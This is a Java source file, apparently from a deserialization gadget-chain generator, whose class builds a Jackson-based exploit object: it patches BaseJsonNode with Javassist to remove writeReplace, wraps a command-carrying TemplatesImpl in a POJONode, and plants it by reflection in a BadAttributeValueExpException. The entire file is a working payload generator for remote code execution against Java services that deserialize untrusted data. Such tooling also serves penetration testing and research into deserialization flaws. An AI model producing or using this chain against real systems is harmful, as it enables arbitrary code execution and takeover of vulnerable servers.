package org.gadget;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.gadget.inter.Gadget;
import org.util.TemplateUtils;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class Jackson implements Gadget {
    public Object getObject(String common, String path) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        TemplatesImpl template = TemplateUtils.getTemplate(common, path);
        POJONode node = new POJONode(template);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        //反射设置val属性
        Field val1 = val.getClass().getDeclaredField("val");
        val1.setAccessible(true);
        val1.set(val, node);

        return val;
    }
}
